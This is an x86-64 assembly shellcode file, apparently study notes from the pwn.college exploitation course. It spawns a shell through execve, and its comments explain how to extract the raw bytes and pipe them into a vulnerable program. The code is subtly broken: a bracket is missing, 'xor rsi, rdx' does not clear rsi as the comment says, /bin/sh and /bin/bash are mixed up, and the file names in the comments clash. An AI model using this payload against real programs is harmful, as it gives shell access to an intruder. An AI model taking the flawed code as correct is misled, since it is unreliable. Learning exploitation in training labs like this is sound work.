/*
credits: pwn college

man 2 execve


# to compile: gcc -nostdlib -static shellcode.s -o shellcode-elf
# to parse the shellcode: objcopy --dump-section .text=shellcode_raw shellcodeelf 
        - echo "" >> shellcode_raw (adds a newline at the end of the shellcode, may be needed)!
# when sending to vulnerable program: ( cat shellcode-raw; cat ) | program
# reason we have the "cat" is that it'll immediately terminate once bin/sh is run we need to make it hang
*/
/*
When debugging if you get a segfault you can do 
x/i $rip to see what the next instruction was (where it crashed)
to print the value of a register 
x/gx $rsi

*/
.global _start
_start:
.intel_syntax noprefix
    mov rax, 59             # syscall for execve is 59 
    lea rdi, [rip+binbash   # into the first argument passing in "/bin/sh"
    xor rsi, rdx            # NULL for second argument
    xor rdx, rdx            # NULL for third argument
    syscall                 # Remember, privileged processes are handed to the kernel, since we're in "userland" we cannot do it.

binbash:
    .string "/bin/bash"
